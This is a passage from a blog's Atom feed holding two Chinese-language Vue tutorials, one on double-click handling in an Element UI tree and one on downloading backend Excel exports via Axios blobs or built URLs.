    <id>http://llmysnow.top/posts/e082dc34/</id>
    <published>2021-06-29T08:16:06.513Z</published>
    <updated>2021-06-29T08:17:45.745Z</updated>
    
    <content type="html"><![CDATA[<h2 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h2><p>双击 tree上的子节点，把节点文字显示在输入框中（这里简化一下，双击 tree 显示文字即可，省略 $emit 那一步）</p><ul><li>注解：<strong>props 可以接收 defaultExpandAll</strong>（是否默认展开所有节点）</li></ul><a id="more"></a><p>效果如下：</p><p><img data-src="https://gitee.com/lilyn/pic/raw/master/company-img/%E5%8F%8C%E5%87%BB%E6%95%88%E6%9E%9C.gif"></p><p>因为 Element 的 tree 组件不支持双击事件，这时可以曲线救国试一下</p><h2 id="基本代码"><a href="#基本代码" class="headerlink" title="基本代码"></a>基本代码</h2><h3 id="树组件代码"><a href="#树组件代码" class="headerlink" title="树组件代码"></a>树组件代码</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  &lt;el-tree</span><br><span class="line">    id=&quot;tree&quot;</span><br><span class="line">    v-loading=&quot;treeDataLoading&quot;</span><br><span class="line">    node-key=&quot;id&quot;</span><br><span class="line">    :data=&quot;treeData&quot;</span><br><span class="line">    :default-expand-all=&quot;defaultExpandAll&quot;</span><br><span class="line">    :expand-on-click-node=&quot;false&quot;</span><br><span class="line">    style=&quot;height: 100%;&quot;</span><br><span class="line">  /&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="javascript">  name: <span class="string">&#x27;TreeDbl&#x27;</span>,</span></span><br><span class="line">  props: &#123;</span><br><span class="line">    defaultExpandAll: &#123;</span><br><span class="line"><span class="javascript">      type: <span class="built_in">Boolean</span>,</span></span><br><span class="line"><span class="javascript">      <span class="keyword">default</span>: <span class="literal">false</span></span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line"><span class="javascript">  <span class="function"><span class="title">data</span>(<span class="params"></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">return</span> &#123;</span></span><br><span class="line">      treeData: [],</span><br><span class="line"><span class="javascript">      treeDataLoading: <span class="literal">false</span>,</span></span><br><span class="line">      resData: [</span><br><span class="line">        &#123;</span><br><span class="line"><span class="javascript">          id: <span class="string">&#x27;1&#x27;</span>,</span></span><br><span class="line"><span class="javascript">          label: <span class="string">&#x27;动物&#x27;</span>,</span></span><br><span class="line"><span class="javascript">          parentId: <span class="string">&#x27;&#x27;</span></span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line"><span class="javascript">          id: <span class="string">&#x27;2&#x27;</span>,</span></span><br><span class="line"><span class="javascript">          label: <span class="string">&#x27;狗&#x27;</span>,</span></span><br><span class="line"><span class="javascript">          parentId: <span class="string">&#x27;1&#x27;</span></span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line"><span class="javascript">          id: <span class="string">&#x27;3&#x27;</span>,</span></span><br><span class="line"><span class="javascript">          label: <span class="string">&#x27;哈士奇&#x27;</span>,</span></span><br><span class="line"><span class="javascript">          parentId: <span class="string">&#x27;2&#x27;</span></span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line"><span class="javascript">          id: <span class="string">&#x27;4&#x27;</span>,</span></span><br><span class="line"><span class="javascript">          label: <span class="string">&#x27;柯基&#x27;</span>,</span></span><br><span class="line"><span class="javascript">          parentId: <span class="string">&#x27;2&#x27;</span></span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line"><span class="javascript">          id: <span class="string">&#x27;6&#x27;</span>,</span></span><br><span class="line"><span class="javascript">          label: <span class="string">&#x27;猫&#x27;</span>,</span></span><br><span class="line"><span class="javascript">          parentId: <span class="string">&#x27;1&#x27;</span></span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line"><span class="javascript">          id: <span class="string">&#x27;7&#x27;</span>,</span></span><br><span class="line"><span class="javascript">          label: <span class="string">&#x27;植物&#x27;</span>,</span></span><br><span class="line"><span class="javascript">          parentId: <span class="string">&#x27;&#x27;</span></span></span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line"><span class="javascript">  <span class="function"><span class="title">created</span>(<span class="params"></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">this</span>.getTree()</span></span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line"><span class="javascript">    <span class="function"><span class="title">dblClickItem</span>(<span class="params">e</span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">if</span> (e.target.nodeName === <span class="string">&#x27;SPAN&#x27;</span>) &#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(e.target.innerText)</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    /*</span><br><span class="line">    以下处理数据逻辑可以直接跳过</span><br><span class="line">    */</span><br><span class="line"><span class="javascript">    <span class="function"><span class="title">getTree</span>(<span class="params"></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">      <span class="built_in">this</span>.treeDataLoading = <span class="literal">true</span></span></span><br><span class="line"><span class="javascript">      <span class="comment">// 发送数据请求（这里不发送请求以resData模拟）</span></span></span><br><span class="line"><span class="javascript">      <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resovle</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">const</span> tree = <span class="built_in">this</span>.resData</span></span><br><span class="line"><span class="javascript">        <span class="built_in">this</span>.treeData = <span class="built_in">this</span>.transfromData(tree)</span></span><br><span class="line">        resovle()</span><br><span class="line">      &#125;)</span><br><span class="line"><span class="javascript">        .catch(<span class="function">() =&gt;</span> &#123;&#125;)</span></span><br><span class="line"><span class="javascript">        .finally(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">          <span class="built_in">this</span>.treeDataLoading = <span class="literal">false</span></span></span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;,</span><br><span class="line"><span class="javascript">    <span class="function"><span class="title">transfromData</span>(<span class="params">data, params = &#123;&#125;</span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">      <span class="comment">// 深拷贝一份（以防连续调用出错）</span></span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> cData = <span class="built_in">JSON</span>.parse(<span class="built_in">JSON</span>.stringify(data))</span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> map = &#123;&#125;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> tData = []</span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> attr = &#123;</span></span><br><span class="line"><span class="javascript">        id: <span class="string">&#x27;id&#x27;</span>,</span></span><br><span class="line"><span class="javascript">        parentId: <span class="string">&#x27;parentId&#x27;</span></span></span><br><span class="line">      &#125;</span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> arg = <span class="built_in">Object</span>.assign(&#123;&#125;, attr, params)</span></span><br><span class="line"><span class="javascript">      <span class="comment">// 注意：这里item的引用地址指向cData</span></span></span><br><span class="line"><span class="javascript">      cData.forEach(<span class="function"><span class="params">item</span> =&gt;</span> (map[item[arg.id]] = item))</span></span><br><span class="line"><span class="javascript">      cData.forEach(<span class="function"><span class="params">child</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">const</span> mapItem = map[child[arg.parentId]]</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span> (mapItem) &#123;</span></span><br><span class="line"><span class="javascript">          <span class="comment">// 注意：这里mapItem引用地址指向也是指向cData</span></span></span><br><span class="line"><span class="javascript">          <span class="keyword">if</span> (!mapItem.children) mapItem.children = []</span></span><br><span class="line">          mapItem.children.push(child)</span><br><span class="line"><span class="javascript">        &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript">          <span class="comment">// 顶级节点</span></span></span><br><span class="line">          tData.push(child)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line"><span class="javascript">      <span class="keyword">return</span> tData</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="父组件代码"><a href="#父组件代码" class="headerlink" title="父组件代码"></a>父组件代码</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">tree-dbl</span> <span class="attr">defaultExpandAll</span> /&gt;</span></span><br></pre></td></tr></table></figure><h3 id="效果如下："><a href="#效果如下：" class="headerlink" title="效果如下："></a>效果如下：</h3><p><img data-src="https://gitee.com/lilyn/pic/raw/master/company-img/TreeDbl1.jpg"></p><h2 id="一个不太好的方案：直接添加事件绑定"><a href="#一个不太好的方案：直接添加事件绑定" class="headerlink" title="一个不太好的方案：直接添加事件绑定"></a>一个不太好的方案：直接添加事件绑定</h2><p>可以直接给 tree添加事件绑定，利用事件委托显示每一个元素的文字信息，可以在 getTree 方法中的 finally 中添加如下代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&#x27;tree&#x27;</span>).addEventListener(<span class="string">&#x27;dblclick&#x27;</span>, <span class="built_in">this</span>.dblClickItem)</span><br></pre></td></tr></table></figure><ul><li>也可以借助 <code>@node-expand</code>（节点被展开时触发的事件） 和 <code>@node-collapse</code> （节点被关闭时触发的事件）添加/解除事件绑定，不过有些麻烦</li><li>也可以使用 <code>@node-click</code> （节点被点击时的回调），记录点击次数，<strong>由于 <code>@node-click</code> 可以拿到点击节点的 data，可以对其进行是否是根节点的判断</strong></li></ul><h2 id="推荐方案：使用自定义节点内容"><a href="#推荐方案：使用自定义节点内容" class="headerlink" title="推荐方案：使用自定义节点内容"></a>推荐方案：使用自定义节点内容</h2><p>可以在节点区添加按钮或图标等内容</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  &lt;el-tree</span><br><span class="line">    id=&quot;tree&quot;</span><br><span class="line">    ref=&quot;tree&quot;</span><br><span class="line">    v-loading=&quot;treeDataLoading&quot;</span><br><span class="line">    node-key=&quot;id&quot;</span><br><span class="line">    :data=&quot;treeData&quot;</span><br><span class="line">    :default-expand-all=&quot;defaultExpandAll&quot;</span><br><span class="line">    :expand-on-click-node=&quot;false&quot;</span><br><span class="line">    style=&quot;height: 100%;&quot;</span><br><span class="line">  &gt;</span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;custom-tree-node&quot;</span> <span class="attr">slot-scope</span>=<span class="string">&quot;&#123; node &#125;&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">span</span> @<span class="attr">dblclick</span>=<span class="string">&quot;dblClickItem&quot;</span>&gt;</span>&#123;&#123; node.label &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">el-tree</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line">&gt;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">scoped</span>&gt;</span></span><br><span class="line"><span class="css"><span class="selector-class">.custom-tree-node</span> &#123;</span></span><br><span class="line">  font-size: 14px;</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;需求&quot;&gt;&lt;a href=&quot;#需求&quot; class=&quot;headerlink&quot; title=&quot;需求&quot;&gt;&lt;/a&gt;需求&lt;/h2&gt;&lt;p&gt;双击 tree上的子节点，把节点文字显示在输入框中（这里简化一下，双击 tree 显示文字即可，省略 $emit 那一步）&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;注解：&lt;strong&gt;props 可以接收 defaultExpandAll&lt;/strong&gt;（是否默认展开所有节点）&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="Vue" scheme="http://llmysnow.top/categories/Vue/"/>
    
    
    <category term="Vue" scheme="http://llmysnow.top/tags/Vue/"/>
    
    <category term="Element" scheme="http://llmysnow.top/tags/Element/"/>
    
    <category term="双击" scheme="http://llmysnow.top/tags/%E5%8F%8C%E5%87%BB/"/>
    
  </entry>
  
  <entry>
    <title>Vue 处理文件的下载（后端Excel导出）</title>
    <link href="http://llmysnow.top/posts/14d3abe4/"/>
    <id>http://llmysnow.top/posts/14d3abe4/</id>
    <published>2021-06-16T02:50:00.003Z</published>
    <updated>2021-07-05T06:46:19.909Z</updated>
    
    <content type="html"><![CDATA[<p>大概有两种方法（通常对应的是需要不需要携带 token），原理都是通过 <code>a</code> 标签下载</p><ol><li>通过 Ajax 请求，拿到 <code>response</code> ，转换为 blob 格式（主要是为了处理 type），为其生成下载链接，下载即可</li><li>直接拼接 URL，拼出来对应请求链接，直接访问即可（不需要二次 token 认证）</li></ol><a id="more"></a><h2 id="后端文件流"><a href="#后端文件流" class="headerlink" title="后端文件流"></a>后端文件流</h2><ul><li>首先点击导出 Excel ，这里调用接口成功</li></ul><p><img data-src="https://gitee.com/lilyn/pic/raw/master/company-img/%E5%AF%BC%E5%87%BAExcel%E6%8E%A5%E5%8F%A3%E6%88%90%E5%8A%9F.jpg"></p><ul><li>接下来看一下后台返回的数据是什么样，是文件流格式（<code>OutputStream</code>）</li></ul><p><img data-src="https://gitee.com/lilyn/pic/raw/master/company-img/%E5%90%8E%E7%AB%AF%E8%BF%94%E5%9B%9E%E7%9A%84%E6%95%B0%E6%8D%AE%E6%B5%81.jpg"></p><p>在处理之前，说几个要注意的点</p><ol><li><p><strong>注意：后端在这里一般会设置如下几个请求头</strong></p><p>后端还可能开启 jwt token 验证，如果开启请移步第 2 点请求拦截设置 headers</p></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 设置返回类型为excel</span></span><br><span class="line">response.setContentType(<span class="string">&quot;application/vnd.ms-excel; charset=UTF-8&quot;</span>);  </span><br><span class="line"><span class="comment">// 设置返回文件名为filename.xls </span></span><br><span class="line">response.setHeader(<span class="string">&quot;Content-Disposition&quot;</span>, <span class="string">&quot;filename.xls&quot;</span>); </span><br><span class="line"><span class="comment">// 请求或响应消息不能走缓存</span></span><br><span class="line">response.setHeader(<span class="string">&quot;Cache-Control&quot;</span>, <span class="string">&quot;no-cache&quot;</span>);  </span><br></pre></td></tr></table></figure><ol start="2"><li><p><strong>注意：前端在 Axios 请求和响应拦截的时候，需要对其进行处理</strong></p><p>请求拦截一般我们都是会设置 headers，这里只是简单处理一下，实际会根据不同情况设置 headers</p><p>响应拦截一般我们都是把 <code>response.data</code> 进行返回，但是这里我们需要把整个 <code>response</code> 返回（因为文件名在 headers 里面）</p></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">&#x27;axios&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123; getToken &#125; <span class="keyword">from</span> <span class="string">&#x27;@/utils/auth&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123; AUTHOR_KEY &#125; <span class="keyword">from</span> <span class="string">&#x27;@/global&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> service = axios.create(&#123;</span><br><span class="line">  baseURL: process.env.NODE_ENV === <span class="string">&#x27;development&#x27;</span> ? <span class="string">&#x27;&#x27;</span> : <span class="string">&#x27;http://127.0.0.1:9999&#x27;</span></span><br><span class="line">  withCredentials: <span class="literal">true</span>,</span><br><span class="line">  timeout: <span class="number">5000</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 请求拦截器</span></span><br><span class="line">service.interceptors.request.use(</span><br><span class="line">  config =&gt; &#123;</span><br><span class="line">    config.headers[AUTHOR_KEY] = getToken()</span><br><span class="line">    <span class="keyword">return</span> config</span><br><span class="line">  &#125;,</span><br><span class="line">  error =&gt; <span class="built_in">console</span>.log(error)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 响应拦截器</span></span><br><span class="line">service.interceptors.response.use(</span><br><span class="line">  response =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (response.config.responseType === <span class="string">&#x27;blob&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> response</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> response.data</span><br><span class="line">  &#125;,</span><br><span class="line">  error =&gt; <span class="built_in">console</span>.log(error)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> service</span><br></pre></td></tr></table></figure><p>接下来要处理这个文件流，大概有两种方法（通常对应的是需要不需要携带 token），原理都是通过 <code>a</code> 标签下载</p><ol><li>通过 Ajax 请求，拿到 <code>response</code> ，转换为 blob 格式（主要是为了处理 type），为其生成下载链接，下载即可</li><li>拼接 URL，拼出来对应请求链接，直接访问即可</li></ol><h2 id="通过-Blob-下载"><a href="#通过-Blob-下载" class="headerlink" title="通过 Blob 下载"></a>通过 Blob 下载</h2><p>Blob 通常用于存储大文件，典型的 Blob 内容是一张图片或一个音频</p><ol><li>默认情况下 axios 不会处理二进制数据，即请求可以正常被浏览器接收，但 axios 不会去处理。<strong>需要在请求的时候设置 <code>responseType: &#39;blob&#39;</code> 才可以</strong></li><li>拿到文件流之后，需要生成一个 URL 才可以下载，可以<strong>通过<code>URL.createObjectURL()</code>方法生成一个链接</strong></li><li>a 标签添加文件名<br>正常情况下，通过 <code>window.location = url</code> 就可以下载文件。浏览器判断这个链接是一个资源而不是页面的时候，就会下载文件。但是通过文件流生成的 url 对应的资源是没有文件名的，需要添加文件名。这时候可以用到 download 属性指定下载的文件名</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> mimeMap = &#123;</span><br><span class="line">  xlsx: <span class="string">&#x27;application/vnd.ms-excel&#x27;</span>,</span><br><span class="line">  zip: <span class="string">&#x27;application/zip&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> toExcel = <span class="function"><span class="params">params</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> request(&#123;</span><br><span class="line">    method: <span class="string">&#x27;get&#x27;</span>,</span><br><span class="line">    url: <span class="string">&#x27;/dayReportToExcel/toExcel&#x27;</span>,</span><br><span class="line">    responseType: <span class="string">&#x27;blob&#x27;</span>,</span><br><span class="line">    params</span><br><span class="line">  &#125;).then(<span class="function"><span class="params">res</span> =&gt;</span> resolveBlob(res, mimeMap.xlsx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">resolveBlob</span>(<span class="params">res, mimeType</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 创建a标签，并处理二级制数据</span></span><br><span class="line">  <span class="keyword">const</span> aLink = <span class="built_in">document</span>.createElement(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">  <span class="keyword">const</span> blob = <span class="keyword">new</span> Blob([res.data], &#123; <span class="attr">type</span>: mimeType &#125;)</span><br><span class="line">  <span class="comment">// 生成下载链接</span></span><br><span class="line">  <span class="keyword">const</span> URL = <span class="built_in">window</span>.URL || <span class="built_in">window</span>.webkitURL</span><br><span class="line">  aLink.href = URL.createObjectURL(blob)</span><br><span class="line">  <span class="comment">// 设置下载文件名称</span></span><br><span class="line">  <span class="keyword">const</span> fileName = res.headers[<span class="string">&#x27;content-disposition&#x27;</span>]</span><br><span class="line">  aLink.setAttribute(<span class="string">&#x27;download&#x27;</span>, fileName)</span><br><span class="line">  <span class="comment">// 下载</span></span><br><span class="line">  <span class="built_in">document</span>.body.appendChild(aLink)</span><br><span class="line">  aLink.click()</span><br><span class="line">  <span class="comment">// 释放URL对象</span></span><br><span class="line">  <span class="built_in">window</span>.URL.revokeObjectURL(aLink.href)</span><br><span class="line">  <span class="built_in">document</span>.body.removeChild(aLink)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意：一般情况下文件名都是需要匹配的，后端传过来的可能是这样的，首选需要 <code>decodeURI</code> 解码一下，再用正则把文件名匹配出来（替换设置下载文件名那里即可）</p><p><img data-src="https://gitee.com/lilyn/pic/raw/master/company-img/Excel%E6%96%87%E4%BB%B6%E5%90%8D.jpg"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> pat = <span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">&#x27;filename=([^;]+\\.[^\\.;]+);*&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> contentDisposition = <span class="built_in">decodeURI</span>(res.headers[<span class="string">&#x27;content-disposition&#x27;</span>])</span><br><span class="line"><span class="keyword">var</span> result = pat.exec(contentDisposition)</span><br><span class="line"><span class="keyword">const</span> fileName = result[<span class="number">1</span>]</span><br><span class="line">aLink.setAttribute(<span class="string">&#x27;download&#x27;</span>, fileName)</span><br></pre></td></tr></table></figure><h2 id="拼接-URL-下载"><a href="#拼接-URL-下载" class="headerlink" title="拼接 URL 下载"></a>拼接 URL 下载</h2><p>如果可以直接通过 URL 下载文件，则可以不需要发送 Ajax 请求（前提是没有 token、headers 验证），直接下载</p><ul><li>可以使用 <code>a</code> 标签进行下载</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> qs <span class="keyword">from</span> <span class="string">&#x27;qs&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">downloadExcel</span>(<span class="params">params</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> url = <span class="built_in">window</span>.location.origin + <span class="string">&#x27;/dayReportToExcel/toExcel?&#x27;</span> + qs.stringify(params)</span><br><span class="line">  <span class="keyword">const</span> aLink = <span class="built_in">document</span>.createElement(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">  aLink.setAttribute(<span class="string">&#x27;download&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">  aLink.setAttribute(<span class="string">&#x27;target&#x27;</span>, <span class="string">&#x27;_blank&#x27;</span>)</span><br><span class="line">  aLink.href = url</span><br><span class="line">  aLink.click()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>可以使用 <code>window.open(url, &#39;_blank&#39;)</code></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> qs <span class="keyword">from</span> <span class="string">&#x27;qs&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">downloadExcel</span>(<span class="params">params</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> url = <span class="built_in">window</span>.location.origin + <span class="string">&#x27;/dayReportToExcel/toExcel?&#x27;</span> + qs.stringify(params)</span><br><span class="line">  <span class="built_in">window</span>.open(url, <span class="string">&#x27;_blank&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;大概有两种方法（通常对应的是需要不需要携带 token），原理都是通过 &lt;code&gt;a&lt;/code&gt; 标签下载&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;通过 Ajax 请求，拿到 &lt;code&gt;response&lt;/code&gt; ，转换为 blob 格式（主要是为了处理 type），为其生成下载链接，下载即可&lt;/li&gt;
&lt;li&gt;直接拼接 URL，拼出来对应请求链接，直接访问即可（不需要二次 token 认证）&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="Vue" scheme="http://llmysnow.top/categories/Vue/"/>
    
    
    <category term="Vue" scheme="http://llmysnow.top/tags/Vue/"/>
    
    <category term="Blob" scheme="http://llmysnow.top/tags/Blob/"/>
    
  </entry>
  
  <entry>
    <title>Python 批量获取文件夹文件名称和数量</title>
